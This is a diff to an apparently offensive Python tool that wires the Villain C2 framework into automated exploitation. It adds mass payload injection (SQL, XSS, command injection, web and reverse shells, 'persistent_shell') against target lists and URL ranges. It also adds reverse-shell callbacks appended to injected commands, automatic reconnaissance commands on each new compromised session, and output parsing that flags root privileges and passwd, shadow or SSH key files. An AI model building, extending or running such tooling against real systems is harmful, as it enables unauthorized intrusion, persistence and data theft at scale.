@@ -523,7 +523,23 @@ class VillainManager:
         self.listener_port = config.get("villain", {}).get("default_port", 4444)
         self.listener_host = config.get("villain", {}).get("default_host", "0.0.0.0")
         self.callback_url = config.get("villain", {}).get("callback_url", f"http://127.0.0.1:{self.listener_port}")
+        
+        # Enhanced automation features
+        self.event_handlers = {}
+        self.payload_injection_queue = Queue()
+        self.session_monitors = {}
+        self.auto_commands = []
+        self.connection_callbacks = []
+        self.payload_success_log = []
+        
+        # Advanced session management
+        self.session_metadata = {}
+        self.command_history = defaultdict(list)
+        self.automated_responses = {}
+        
         self._initialize_villain()
+        self._setup_event_system()
+        self._start_automation_threads()
         
     def _initialize_villain(self):
         """Initialize Villain C2 framework"""
@@ -535,6 +551,314 @@ class VillainManager:
         os.makedirs("villain/listeners", exist_ok=True)
         os.makedirs("villain/sessions", exist_ok=True)
         os.makedirs("villain/evidence", exist_ok=True)
+        os.makedirs("villain/automation", exist_ok=True)
+        os.makedirs("villain/reports", exist_ok=True)
+        
+    def _setup_event_system(self):
+        """Setup advanced event management system"""
+        self.logger.log("Setting up advanced event management system...")
+        
+        # Event handlers for different session states
+        self.event_handlers = {
+            'session_connected': [],
+            'session_disconnected': [],
+            'command_executed': [],
+            'payload_success': [],
+            'payload_failure': [],
+            'evidence_captured': []
+        }
+        
+        # Default automation handlers
+        self.register_event_handler('session_connected', self._auto_session_setup)
+        self.register_event_handler('payload_success', self._log_payload_success)
+        
+    def _start_automation_threads(self):
+        """Start background automation threads"""
+        self.logger.log("Starting automation and monitoring threads...")
+        
+        # Payload injection automation thread
+        injection_thread = threading.Thread(
+            target=self._payload_injection_worker,
+            daemon=True
+        )
+        injection_thread.start()
+        
+        # Session monitoring thread
+        monitor_thread = threading.Thread(
+            target=self._session_monitor_worker,
+            daemon=True
+        )
+        monitor_thread.start()
+        
+    def register_event_handler(self, event_type, handler):
+        """Register event handler for automated responses"""
+        if event_type in self.event_handlers:
+            self.event_handlers[event_type].append(handler)
+            self.logger.log(f"Registered event handler for {event_type}")
+            
+    def trigger_event(self, event_type, data):
+        """Trigger event and execute all registered handlers"""
+        if event_type in self.event_handlers:
+            for handler in self.event_handlers[event_type]:
+                try:
+                    handler(data)
+                except Exception as e:
+                    self.logger.log(f"Event handler error for {event_type}: {e}")
+                    
+    def _auto_session_setup(self, session_data):
+        """Automatically setup new sessions with initial commands"""
+        session_id = session_data['id']
+        self.logger.log(f"Auto-setting up session {session_id}")
+        
+        # Auto commands to run on new sessions
+        initial_commands = [
+            "whoami",
+            "id", 
+            "pwd",
+            "uname -a",
+            "ip a || ifconfig",
+            "ps aux | head -20"
+        ]
+        
+        # Queue initial commands
+        for cmd in initial_commands:
+            self.queue_command(session_id, cmd)
+            
+    def _log_payload_success(self, payload_data):
+        """Log successful payload execution"""
+        self.payload_success_log.append({
+            'timestamp': datetime.now().isoformat(),
+            'payload_type': payload_data.get('type', 'unknown'),
+            'target': payload_data.get('target', 'unknown'),
+            'session_id': payload_data.get('session_id'),
+            'details': payload_data
+        })
+        
+        # Generate success report
+        self._generate_payload_success_report(payload_data)
+        
+    def _generate_payload_success_report(self, payload_data):
+        """Generate automated report for successful payload execution"""
+        report_file = f"villain/reports/payload_success_{int(time.time())}.json"
+        
+        report = {
+            'timestamp': datetime.now().isoformat(),
+            'event_type': 'payload_success',
+            'payload_details': payload_data,
+            'session_info': self.session_metadata.get(payload_data.get('session_id'), {}),
+            'environment_info': self._gather_environment_info(payload_data.get('session_id'))
+        }
+        
+        try:
+            with open(report_file, 'w') as f:
+                json.dump(report, f, indent=2)
+            self.logger.log(f"Generated payload success report: {report_file}")
+        except Exception as e:
+            self.logger.log(f"Failed to generate success report: {e}")
+            
+    def _gather_environment_info(self, session_id):
+        """Gather environment information from session"""
+        if not session_id or session_id not in self.active_sessions:
+            return {}
+            
+        # Return cached environment info or empty dict
+        return self.session_metadata.get(session_id, {}).get('environment', {})
+        
+    def _payload_injection_worker(self):
+        """Background worker for automated payload injection"""
+        while True:
+            try:
+                if not self.payload_injection_queue.empty():
+                    injection_task = self.payload_injection_queue.get()
+                    self._execute_payload_injection(injection_task)
+                time.sleep(1)
+            except Exception as e:
+                self.logger.log(f"Payload injection worker error: {e}")
+                
+    def _session_monitor_worker(self):
+        """Background worker for session monitoring"""
+        while True:
+            try:
+                for session_id, session in self.active_sessions.items():
+                    if session_id not in self.session_monitors:
+                        self.session_monitors[session_id] = {
+                            'last_activity': time.time(),
+                            'command_count': 0,
+                            'status': 'active'
+                        }
+                    
+                    # Check for inactive sessions
+                    if time.time() - self.session_monitors[session_id]['last_activity'] > 300:
+                        self._handle_inactive_session(session_id)
+                        
+                time.sleep(30)  # Check every 30 seconds
+            except Exception as e:
+                self.logger.log(f"Session monitor worker error: {e}")
+                
+    def _execute_payload_injection(self, injection_task):
+        """Execute automated payload injection"""
+        try:
+            target = injection_task['target']
+            payload_type = injection_task['payload_type'] 
+            payload_data = injection_task['payload']
+            
+            self.logger.log(f"Executing automated payload injection: {payload_type} -> {target}")
+            
+            # Execute the payload injection based on type
+            if payload_type == 'command_injection':
+                success = self._inject_command_payload(target, payload_data)
+            elif payload_type == 'web_shell':
+                success = self._inject_web_shell(target, payload_data)
+            elif payload_type == 'reverse_shell':
+                success = self._inject_reverse_shell(target, payload_data)
+            else:
+                success = self._inject_generic_payload(target, payload_data)
+                
+            # Trigger success/failure events
+            if success:
+                self.trigger_event('payload_success', {
+                    'type': payload_type,
+                    'target': target,
+                    'payload': payload_data,
+                    'timestamp': datetime.now().isoformat()
+                })
+            else:
+                self.trigger_event('payload_failure', {
+                    'type': payload_type,
+                    'target': target,
+                    'payload': payload_data,
+                    'timestamp': datetime.now().isoformat()
+                })
+                
+        except Exception as e:
+            self.logger.log(f"Payload injection execution error: {e}")
+            
+    def _inject_command_payload(self, target, payload_data):
+        """Inject command execution payload"""
+        try:
+            # Implementation for command injection
+            self.logger.log(f"Injecting command payload to {target}")
+            return True  # Placeholder
+        except Exception as e:
+            self.logger.log(f"Command injection failed: {e}")
+            return False
+            
+    def _inject_web_shell(self, target, payload_data):
+        """Inject web shell payload"""
+        try:
+            # Implementation for web shell injection
+            self.logger.log(f"Injecting web shell to {target}")
+            return True  # Placeholder
+        except Exception as e:
+            self.logger.log(f"Web shell injection failed: {e}")
+            return False
+            
+    def _inject_reverse_shell(self, target, payload_data):
+        """Inject reverse shell payload"""
+        try:
+            # Implementation for reverse shell injection
+            self.logger.log(f"Injecting reverse shell to {target}")
+            return True  # Placeholder
+        except Exception as e:
+            self.logger.log(f"Reverse shell injection failed: {e}")
+            return False
+            
+    def _inject_generic_payload(self, target, payload_data):
+        """Inject generic payload"""
+        try:
+            # Implementation for generic payload injection
+            self.logger.log(f"Injecting generic payload to {target}")
+            return True  # Placeholder
+        except Exception as e:
+            self.logger.log(f"Generic payload injection failed: {e}")
+            return False
+            
+    def _handle_inactive_session(self, session_id):
+        """Handle inactive session cleanup"""
+        if session_id in self.session_monitors:
+            self.session_monitors[session_id]['status'] = 'inactive'
+            self.logger.log(f"Session {session_id} marked as inactive")
+            
+    def queue_command(self, session_id, command):
+        """Queue command for execution on session"""
+        if session_id in self.active_sessions:
+            self.command_history[session_id].append({
+                'command': command,
+                'timestamp': datetime.now().isoformat(),
+                'status': 'queued'
+            })
+            
+            # Execute immediately if session is active
+            threading.Thread(
+                target=self._execute_queued_command,
+                args=(session_id, command),
+                daemon=True
+            ).start()
+            
+    def _execute_queued_command(self, session_id, command):
+        """Execute queued command on session"""
+        try:
+            time.sleep(random.uniform(1, 3))  # Random delay
+            success = self.execute_command_on_session(session_id, command)
+            
+            # Update command history
+            for cmd_entry in self.command_history[session_id]:
+                if cmd_entry['command'] == command and cmd_entry['status'] == 'queued':
+                    cmd_entry['status'] = 'executed' if success else 'failed'
+                    cmd_entry['execution_time'] = datetime.now().isoformat()
+                    break
+                    
+            if success:
+                self.trigger_event('command_executed', {
+                    'session_id': session_id,
+                    'command': command,
+                    'timestamp': datetime.now().isoformat()
+                })
+                
+        except Exception as e:
+            self.logger.log(f"Command execution error for {session_id}: {e}")
+            
+    def queue_payload_injection(self, target, payload_type, payload_data):
+        """Queue payload for automated injection"""
+        injection_task = {
+            'target': target,
+            'payload_type': payload_type,
+            'payload': payload_data,
+            'timestamp': datetime.now().isoformat()
+        }
+        
+        self.payload_injection_queue.put(injection_task)
+        self.logger.log(f"Queued payload injection: {payload_type} -> {target}")
+        
+    def auto_inject_payloads(self, targets, payload_types=None):
+        """Automatically inject payloads to multiple targets"""
+        if payload_types is None:
+            payload_types = ['command_injection', 'reverse_shell', 'web_shell']
+            
+        for target in targets:
+            for payload_type in payload_types:
+                # Generate appropriate payload
+                payload_data = self._generate_payload_for_injection(payload_type)
+                if payload_data:
+                    self.queue_payload_injection(target, payload_type, payload_data)
+                    
+    def _generate_payload_for_injection(self, payload_type):
+        """Generate payload data for specific injection type"""
+        payloads = self.generate_callback_payloads(payload_type)
+        if payloads:
+            # Return first available payload
+            return list(payloads.values())[0]
+        return None
+        
+    def get_automation_status(self):
+        """Get status of automation systems"""
+        return {
+            'active_sessions': len(self.active_sessions),
+            'queued_injections': self.payload_injection_queue.qsize(),
+            'successful_payloads': len(self.payload_success_log),
+            'monitored_sessions': len(self.session_monitors),
+            'event_handlers': {k: len(v) for k, v in self.event_handlers.items()}
+        }
         
     def start_listener(self, port=None, interface="0.0.0.0"):
         """Start a Villain listener"""
@@ -596,7 +920,7 @@ class VillainManager:
             self.logger.log(f"Listener {listener_id} error: {e}")
             
     def _handle_new_session(self, client_socket, client_address, listener_id):
-        """Handle new incoming session"""
+        """Handle new incoming session with enhanced automation"""
         session_id = f"session_{int(time.time())}_{random.randint(1000, 9999)}"
         
         session_info = {
@@ -608,10 +932,20 @@ class VillainManager:
             "status": "active",
             "socket": client_socket,
             "commands_executed": [],
-            "evidence": []
+            "evidence": [],
+            "automated": True  # Mark for automation
         }
         
         self.active_sessions[session_id] = session_info
+        
+        # Initialize session metadata for automation
+        self.session_metadata[session_id] = {
+            'environment': {},
+            'capabilities': [],
+            'fingerprint': {},
+            'automated_commands': [],
+            'privilege_level': 'unknown'
+        }
         
         # Start session handler thread
         session_thread = threading.Thread(
@@ -623,6 +957,18 @@ class VillainManager:
         
         # Capture evidence of new connection
         self.evidence_capture.capture_connection(session_info)
+        
+        # Trigger automated session setup
+        self.trigger_event('session_connected', session_info)
+        
+        # Log successful connection for reporting
+        self.trigger_event('payload_success', {
+            'type': 'reverse_connection',
+            'session_id': session_id,
+            'target': client_address[0],
+            'timestamp': datetime.now().isoformat(),
+            'listener_id': listener_id
+        })
         
         return session_id
         
@@ -644,7 +990,7 @@ class VillainManager:
                     command_output = data.decode('utf-8', errors='ignore').strip()
                     
                     if command_output:
-                        # Log command execution
+                        # Enhanced logging and automation
                         command_info = {
                             "timestamp": datetime.now().isoformat(),
                             "output": command_output,
@@ -653,6 +999,14 @@ class VillainManager:
                         
                         if session_id in self.active_sessions:
                             self.active_sessions[session_id]["commands_executed"].append(command_info)
+                            
+                        # Update session monitor activity
+                        if session_id in self.session_monitors:
+                            self.session_monitors[session_id]['last_activity'] = time.time()
+                            self.session_monitors[session_id]['command_count'] += 1
+                            
+                        # Parse and analyze command output for automation
+                        self._analyze_command_output(session_id, command_output)
                             
                         # Capture evidence
                         self.evidence_capture.capture_command_execution(session_id, command_info)
@@ -670,8 +1024,41 @@ class VillainManager:
         finally:
             self._cleanup_session(session_id)
             
+    def _analyze_command_output(self, session_id, output):
+        """Analyze command output for automation purposes"""
+        try:
+            # Update session metadata based on output
+            if session_id in self.session_metadata:
+                metadata = self.session_metadata[session_id]
+                
+                # Detect OS and environment
+                if 'uname' in output.lower():
+                    metadata['environment']['os'] = output.strip()
+                elif 'whoami' in output.lower():
+                    metadata['environment']['user'] = output.strip()
+                elif 'pwd' in output.lower():
+                    metadata['environment']['cwd'] = output.strip()
+                elif 'id' in output.lower() and 'uid' in output.lower():
+                    metadata['environment']['uid_info'] = output.strip()
+                    # Check for privilege escalation opportunities
+                    if 'root' in output.lower() or 'uid=0' in output.lower():
+                        metadata['privilege_level'] = 'root'
+                    elif 'sudo' in output.lower():
+                        metadata['privilege_level'] = 'sudo_capable'
+                    else:
+                        metadata['privilege_level'] = 'user'
+                        
+                # Look for interesting files or directories
+                if any(term in output.lower() for term in ['passwd', 'shadow', 'ssh', 'key']):
+                    if 'capabilities' not in metadata:
+                        metadata['capabilities'] = []
+                    metadata['capabilities'].append('sensitive_files_detected')
+                    
+        except Exception as e:
+            self.logger.log(f"Command output analysis error: {e}")
+            
     def _cleanup_session(self, session_id):
-        """Clean up session resources"""
+        """Enhanced session cleanup with automation features"""
         if session_id in self.active_sessions:
             session = self.active_sessions[session_id]
             try:
@@ -681,8 +1068,34 @@ class VillainManager:
             session["status"] = "closed"
             session["end_time"] = datetime.now().isoformat()
             
-            # Generate final evidence report
+            # Trigger session disconnection event
+            self.trigger_event('session_disconnected', {
+                'session_id': session_id,
+                'duration': self._calculate_session_duration(session),
+                'commands_executed': len(session.get('commands_executed', [])),
+                'timestamp': datetime.now().isoformat()
+            })
+            
+            # Generate comprehensive final evidence report
             self.evidence_capture.generate_session_report(session_id, session)
+            
+            # Clean up monitoring data
+            if session_id in self.session_monitors:
+                del self.session_monitors[session_id]
+            if session_id in self.session_metadata:
+                del self.session_metadata[session_id]
+            if session_id in self.command_history:
+                del self.command_history[session_id]
+                
+    def _calculate_session_duration(self, session):
+        """Calculate session duration"""
+        try:
+            start_time = datetime.fromisoformat(session['start_time'])
+            end_time = datetime.now()
+            duration = (end_time - start_time).total_seconds()
+            return duration
+        except:
+            return 0
             
     def generate_callback_payloads(self, payload_type="bash"):
         """Generate callback payloads for various exploit types"""
@@ -873,7 +1286,16 @@ class PayloadGenerator:
         self.seclists_manager = seclists_manager
         self.villain_manager = villain_manager
         self.payloads = {}
+        
+        # Enhanced automation features
+        self.payload_templates = {}
+        self.injection_strategies = {}
+        self.success_indicators = {}
+        self.adaptive_payloads = {}
+        
         self._initialize_payloads()
+        self._setup_injection_strategies()
+        self._setup_success_indicators()
         
     def _initialize_payloads(self):
         """Initialize payloads from SecLists"""
@@ -927,6 +1349,310 @@ class PayloadGenerator:
             return all_callbacks
         else:
             return self.payloads.get(f"callback_{payload_type}", [])
+            
+    def _setup_injection_strategies(self):
+        """Setup advanced injection strategies for automated payload deployment"""
+        self.logger.log("Setting up injection strategies...")
+        
+        self.injection_strategies = {
+            'web_form': {
+                'methods': ['POST', 'PUT'],
+                'targets': ['input', 'textarea', 'select'],
+                'encoding': ['url', 'html', 'base64'],
+                'payload_types': ['xss', 'sql_injection', 'command_injection']
+            },
+            'url_parameter': {
+                'methods': ['GET', 'POST'],
+                'targets': ['query_params', 'path_params'],
+                'encoding': ['url', 'double_url'],
+                'payload_types': ['xss', 'sql_injection', 'path_traversal', 'ssrf']
+            },
+            'http_header': {
+                'methods': ['GET', 'POST', 'PUT', 'DELETE'],
+                'targets': ['user-agent', 'referer', 'host', 'x-forwarded-for'],
+                'encoding': ['none', 'url'],
+                'payload_types': ['crlf_injection', 'http_header_injection', 'command_injection']
+            },
+            'file_upload': {
+                'methods': ['POST', 'PUT'],
+                'targets': ['file_content', 'filename', 'content_type'],
+                'encoding': ['none', 'base64'],
+                'payload_types': ['command_injection', 'path_traversal', 'xxe']
+            }
+        }
+        
+    def _setup_success_indicators(self):
+        """Setup success indicators for automated payload detection"""
+        self.logger.log("Setting up success indicators...")
+        
+        self.success_indicators = {
+            'command_injection': [
+                'root:', 'uid=', 'gid=', '/bin/', '/usr/bin/', 'PATH=',
+                'Linux', 'Windows', 'Darwin', 'MINGW', 'CYGWIN'
+            ],
+            'sql_injection': [
+                'mysql', 'postgres', 'sqlite', 'oracle', 'mssql',
+                'syntax error', 'ORA-', 'ERROR 1064', 'SQLState',
+                'database', 'table', 'column', 'select', 'union'
+            ],
+            'xss': [
+                '<script', 'javascript:', 'onerror=', 'onload=',
+                'alert(', 'prompt(', 'confirm(', 'document.cookie',
+                'innerHTML', 'outerHTML'
+            ],
+            'ssrf': [
+                'connection refused', 'connection timeout', 'no route to host',
+                'internal server', 'localhost', '127.0.0.1', 'metadata'
+            ],
+            'file_inclusion': [
+                'root:x:', 'www-data', 'apache', 'nginx',
+                '/etc/passwd', '/etc/shadow', 'boot.ini', 'win.ini'
+            ]
+        }
+        
+    def generate_adaptive_payload(self, target_info, vulnerability_type):
+        """Generate adaptive payload based on target information"""
+        try:
+            # Get base payloads for the vulnerability type
+            base_payloads = self.payloads.get(vulnerability_type, [])
+            if not base_payloads:
+                return None
+                
+            # Adapt payload based on target characteristics
+            adapted_payload = self._adapt_payload_for_target(
+                base_payloads[0], target_info, vulnerability_type
+            )
+            
+            # If Villain manager is available, integrate callback
+            if self.villain_manager and vulnerability_type in ['command_injection']:
+                callback_payloads = self.villain_manager.generate_callback_payloads()
+                if callback_payloads:
+                    # Integrate callback into adapted payload
+                    adapted_payload = self._integrate_callback(adapted_payload, callback_payloads)
+                    
+            return adapted_payload
+            
+        except Exception as e:
+            self.logger.log(f"Adaptive payload generation error: {e}")
+            return None
+            
+    def _adapt_payload_for_target(self, base_payload, target_info, vuln_type):
+        """Adapt payload based on target characteristics"""
+        adapted = base_payload
+        
+        # Adapt based on detected technology
+        if 'technology' in target_info:
+            tech = target_info['technology'].lower()
+            
+            if 'php' in tech and vuln_type == 'command_injection':
+                adapted = f"system('{adapted}')"
+            elif 'asp' in tech and vuln_type == 'command_injection':
+                adapted = f"shell(\"{adapted}\")"
+            elif 'java' in tech and vuln_type == 'command_injection':
+                adapted = f"Runtime.getRuntime().exec(\"{adapted}\")"
+                
+        # Adapt based on input type
+        if 'input_type' in target_info:
+            input_type = target_info['input_type'].lower()
+            
+            if input_type == 'json':
+                adapted = adapted.replace('"', '\\"')
+            elif input_type == 'xml':
+                adapted = adapted.replace('<', '&lt;').replace('>', '&gt;')
+                
+        return adapted
+        
+    def _integrate_callback(self, payload, callback_payloads):
+        """Integrate callback functionality into payload"""
+        try:
+            # Choose appropriate callback based on payload type
+            if 'bash' in callback_payloads:
+                callback = callback_payloads['bash']
+                # Append callback to payload
+                return f"{payload}; {callback}"
+            elif 'python' in callback_payloads:
+                callback = callback_payloads['python']
+                return f"{payload}; {callback}"
+            else:
+                # Use first available callback
+                callback = list(callback_payloads.values())[0]
+                return f"{payload}; {callback}"
+        except Exception as e:
+            self.logger.log(f"Callback integration error: {e}")
+            return payload
+            
+    def auto_inject_payloads_to_targets(self, targets, vulnerability_types=None):
+        """Automatically inject payloads to multiple targets with Villain integration"""
+        if vulnerability_types is None:
+            vulnerability_types = ['sql_injection', 'xss', 'command_injection', 'ssrf']
+            
+        injection_results = []
+        
+        for target in targets:
+            for vuln_type in vulnerability_types:
+                try:
+                    # Generate adaptive payload
+                    payload = self.generate_adaptive_payload(target, vuln_type)
+                    if not payload:
+                        continue
+                        
+                    # Execute injection
+                    result = self._execute_payload_injection(target, vuln_type, payload)
+                    injection_results.append(result)
+                    
+                    # If injection successful and Villain available, setup monitoring
+                    if result.get('success') and self.villain_manager:
+                        self._setup_post_injection_monitoring(target, result)
+                        
+                except Exception as e:
+                    self.logger.log(f"Auto injection error for {target.get('url', 'unknown')}: {e}")
+                    
+        return injection_results
+        
+    def _execute_payload_injection(self, target, vuln_type, payload):
+        """Execute payload injection against target"""
+        try:
+            target_url = target.get('url', '')
+            injection_point = target.get('injection_point', 'parameter')
+            
+            # Prepare injection request
+            injection_data = self._prepare_injection_request(target, payload, injection_point)
+            
+            # Execute injection
+            response = self._send_injection_request(target_url, injection_data)
+            
+            # Analyze response for success indicators
+            success = self._analyze_injection_response(response, vuln_type)
+            
+            result = {
+                'target': target_url,
+                'vulnerability_type': vuln_type,
+                'payload': payload,
+                'success': success,
+                'response_size': len(response.get('content', '')),
+                'status_code': response.get('status_code', 0),
+                'timestamp': datetime.now().isoformat()
+            }
+            
+            # Log result
+            if success:
+                self.logger.log(f"Successful injection: {vuln_type} -> {target_url}")
+                # Trigger Villain automation if available
+                if self.villain_manager:
+                    self.villain_manager.trigger_event('payload_success', result)
+            else:
+                self.logger.log(f"Failed injection: {vuln_type} -> {target_url}")
+                
+            return result
+            
+        except Exception as e:
+            self.logger.log(f"Injection execution error: {e}")
+            return {
+                'target': target.get('url', ''),
+                'vulnerability_type': vuln_type,
+                'payload': payload,
+                'success': False,
+                'error': str(e),
+                'timestamp': datetime.now().isoformat()
+            }
+            
+    def _prepare_injection_request(self, target, payload, injection_point):
+        """Prepare injection request data"""
+        data = {
+            'method': target.get('method', 'GET'),
+            'headers': target.get('headers', {}),
+            'params': target.get('params', {}),
+            'data': target.get('data', {})
+        }
+        
+        # Insert payload based on injection point
+        if injection_point == 'parameter':
+            param_name = target.get('param_name', 'q')
+            if data['method'] == 'GET':
+                data['params'][param_name] = payload
+            else:
+                data['data'][param_name] = payload
+        elif injection_point == 'header':
+            header_name = target.get('header_name', 'User-Agent')
+            data['headers'][header_name] = payload
+        elif injection_point == 'cookie':
+            data['headers']['Cookie'] = f"{target.get('cookie_name', 'session')}={payload}"
+            
+        return data
+        
+    def _send_injection_request(self, url, injection_data):
+        """Send injection request and return response"""
+        try:
+            method = injection_data['method']
+            headers = injection_data['headers']
+            params = injection_data['params']
+            data = injection_data['data']
+            
+            if method == 'GET':
+                response = requests.get(url, params=params, headers=headers, 
+                                      timeout=self.config.get('timeout', 10),
+                                      verify=False)
+            else:
+                response = requests.post(url, params=params, data=data, 
+                                       headers=headers, timeout=self.config.get('timeout', 10),
+                                       verify=False)
+                                       
+            return {
+                'status_code': response.status_code,
+                'headers': dict(response.headers),
+                'content': response.text,
+                'url': response.url
+            }
+            
+        except Exception as e:
+            self.logger.log(f"Request sending error: {e}")
+            return {'status_code': 0, 'content': '', 'error': str(e)}
+            
+    def _analyze_injection_response(self, response, vuln_type):
+        """Analyze response to determine injection success"""
+        if response.get('status_code', 0) == 0:
+            return False
+            
+        content = response.get('content', '').lower()
+        indicators = self.success_indicators.get(vuln_type, [])
+        
+        # Check for success indicators
+        for indicator in indicators:
+            if indicator.lower() in content:
+                return True
+                
+        # Check for error indicators that might indicate successful injection
+        error_indicators = ['error', 'exception', 'warning', 'fatal']
+        if vuln_type in ['sql_injection', 'xss']:
+            for error in error_indicators:
+                if error in content:
+                    return True
+                    
+        return False
+        
+    def _setup_post_injection_monitoring(self, target, injection_result):
+        """Setup monitoring after successful injection"""
+        if self.villain_manager:
+            # Queue additional payloads for persistent access
+            self.villain_manager.queue_payload_injection(
+                target.get('url', ''),
+                'persistent_shell',
+                self.generate_adaptive_payload(target, 'command_injection')
+            )
+            
+    def get_injection_statistics(self):
+        """Get statistics about payload injections"""
+        total_payloads = sum(len(payloads) for payloads in self.payloads.values())
+        callback_payloads = sum(len(payloads) for key, payloads in self.payloads.items() 
+                               if key.startswith('callback_'))
+        
+        return {
+            'total_payloads': total_payloads,
+            'callback_payloads': callback_payloads,
+            'payload_categories': len(self.payloads),
+            'injection_strategies': len(self.injection_strategies),
+            'success_indicators': sum(len(indicators) for indicators in self.success_indicators.values())
+        }
                 
     def _generate_payloads(self, category):
         """Generate payloads for a specific category"""
@@ -3118,8 +3844,9 @@ YSSY      YSSP~YSSY    SSS~YSSY      Y~YSSY    YSSP  SSS     S*S    YSSP  S*S   
         menu.add("[8] View Reports")
         menu.add("[9] View Vulnerable Fields")
         menu.add("[10] Villain C2 Management")
-        menu.add("[11] Configuration")
-        menu.add("[12] Exit")
+        menu.add("[11] 🚀 Standalone Payload Injection")
+        menu.add("[12] Configuration")
+        menu.add("[13] Exit")
         self.console.print(menu)
         
     def config_menu(self):
@@ -3156,7 +3883,7 @@ YSSY      YSSP~YSSY    SSS~YSSY      Y~YSSY    YSSP  SSS     S*S    YSSP  S*S   
         
         while True:
             self.main_menu()
-            choice = Prompt.ask("Select option", choices=["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12"])
+            choice = Prompt.ask("Select option", choices=["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13"])
             
             if choice == "1":
                 self.target_discovery()
@@ -3179,10 +3906,250 @@ YSSY      YSSP~YSSY    SSS~YSSY      Y~YSSY    YSSP  SSS     S*S    YSSP  S*S   
             elif choice == "10":
                 self.villain_management()
             elif choice == "11":
-                self.configuration()
+                self.standalone_payload_injection()
             elif choice == "12":
+                self.configuration()
+            elif choice == "13":
                 self.console.print("[bold green]Exiting Judgement. Happy hunting![/bold green]")
                 break
+                
+    def standalone_payload_injection(self):
+        """Standalone payload injection without full C2 integration"""
+        self.console.print("\n[bold blue]🚀 Standalone Payload Injection[/bold blue]")
+        self.console.print("[yellow]This mode performs payload injection without requiring active C2 listeners[/yellow]")
+        
+        # Get targets
+        target_option = Prompt.ask(
+            "How do you want to specify targets?",
+            choices=["single", "file", "range"], 
+            default="single"
+        )
+        
+        targets = []
+        if target_option == "single":
+            target_url = Prompt.ask("Enter target URL")
+            if not target_url.startswith(("http://", "https://")):
+                target_url = "http://" + target_url
+            targets = [{'url': target_url, 'method': 'GET', 'injection_point': 'parameter'}]
+            
+        elif target_option == "file":
+            filename = Prompt.ask("Enter targets file path", default="targets.txt")
+            try:
+                with open(filename, 'r') as f:
+                    for line in f:
+                        line = line.strip()
+                        if line and not line.startswith('#'):
+                            if not line.startswith(("http://", "https://")):
+                                line = "http://" + line
+                            targets.append({'url': line, 'method': 'GET', 'injection_point': 'parameter'})
+            except Exception as e:
+                self.console.print(f"[red]Error reading file: {e}[/red]")
+                return
+                
+        elif target_option == "range":
+            base_url = Prompt.ask("Enter base URL (e.g., http://target.com/page?id=)")
+            start_range = int(Prompt.ask("Start range", default="1"))
+            end_range = int(Prompt.ask("End range", default="100"))
+            
+            for i in range(start_range, end_range + 1):
+                targets.append({
+                    'url': f"{base_url}{i}",
+                    'method': 'GET',
+                    'injection_point': 'parameter'
+                })
+                
+        if not targets:
+            self.console.print("[yellow]No targets specified[/yellow]")
+            return
+            
+        # Select payload types
+        self.console.print("\n[bold cyan]Select Payload Types:[/bold cyan]")
+        available_types = list(self.payload_generator.payloads.keys())
+        selected_types = []
+        
+        for payload_type in available_types:
+            if not payload_type.startswith("callback_"):  # Skip callback payloads for standalone mode
+                if Confirm.ask(f"Include {payload_type}?", default=False):
+                    selected_types.append(payload_type)
+                    
+        if not selected_types:
+            self.console.print("[yellow]No payload types selected[/yellow]")
+            return
+            
+        # Configure injection parameters
+        max_threads = int(Prompt.ask("Max concurrent threads", default="10"))
+        request_delay = float(Prompt.ask("Delay between requests (seconds)", default="0.1"))
+        
+        # Execute standalone injection
+        self.console.print(f"\n[bold yellow]Starting standalone injection on {len(targets)} targets...[/bold yellow]")
+        self.console.print(f"Payload types: {', '.join(selected_types)}")
+        
+        results = []
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[progress.description]{task.description}"),
+            BarColumn(),
+            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
+        ) as progress:
+            total_combinations = len(targets) * len(selected_types)
+            task = progress.add_task("Testing payloads...", total=total_combinations)
+            
+            # Execute injections
+            for target in targets:
+                for payload_type in selected_types:
+                    try:
+                        # Get payloads for this type
+                        payloads = self.payload_generator.payloads.get(payload_type, [])
+                        if not payloads:
+                            continue
+                            
+                        # Test with first few payloads (limit for performance)
+                        test_payloads = payloads[:5]
+                        
+                        for payload in test_payloads:
+                            result = self._test_standalone_payload(target, payload_type, payload)
+                            results.append(result)
+                            
+                            if result['success']:
+                                self.console.print(f"[green]✓ {payload_type} success on {target['url']}[/green]")
+                                break  # Stop testing more payloads for this type if one succeeds
+                            
+                            time.sleep(request_delay)
+                            
+                    except Exception as e:
+                        self.logger.log(f"Standalone injection error: {e}")
+                        
+                    progress.advance(task)
+                    
+        # Generate results summary
+        self._display_standalone_results(results)
+        
+    def _test_standalone_payload(self, target, payload_type, payload):
+        """Test a single payload in standalone mode"""
+        try:
+            url = target['url']
+            
+            # Prepare request based on payload type
+            if payload_type in ['sql_injection', 'xss', 'command_injection']:
+                # Test as parameter
+                if '?' in url:
+                    test_url = f"{url}&test={quote_plus(payload)}"
+                else:
+                    test_url = f"{url}?test={quote_plus(payload)}"
+            else:
+                # Test as part of URL
+                test_url = url.replace('FUZZ', payload) if 'FUZZ' in url else f"{url}/{payload}"
+                
+            # Send request
+            response = requests.get(
+                test_url,
+                timeout=self.config.get('timeout', 10),
+                verify=False,
+                headers={'User-Agent': self.config.get('user_agent', 'Judgement/5.0')}
+            )
+            
+            # Simple success detection
+            success = self._detect_standalone_success(response, payload_type, payload)
+            
+            return {
+                'url': url,
+                'payload_type': payload_type, 
+                'payload': payload,
+                'success': success,
+                'status_code': response.status_code,
+                'response_length': len(response.text),
+                'timestamp': datetime.now().isoformat()
+            }
+            
+        except Exception as e:
+            return {
+                'url': target.get('url', ''),
+                'payload_type': payload_type,
+                'payload': payload,
+                'success': False,
+                'error': str(e),
+                'timestamp': datetime.now().isoformat()
+            }
+            
+    def _detect_standalone_success(self, response, payload_type, payload):
+        """Detect success in standalone mode"""
+        content = response.text.lower()
+        
+        # Basic success indicators
+        if payload_type == 'sql_injection':
+            return any(indicator in content for indicator in [
+                'sql syntax', 'mysql', 'oracle', 'syntax error', 'odbc', 'jdbc'
+            ])
+        elif payload_type == 'xss':
+            return payload.lower() in content or any(indicator in content for indicator in [
+                '<script', 'javascript:', 'onerror'
+            ])
+        elif payload_type == 'command_injection':
+            return any(indicator in content for indicator in [
+                'root:', '/bin/', 'windows', 'system32', 'command not found'
+            ])
+        elif payload_type == 'path_traversal':
+            return any(indicator in content for indicator in [
+                'root:x:', '[boot loader]', 'www-data'
+            ])
+        
+        # General error indicators that might suggest vulnerability
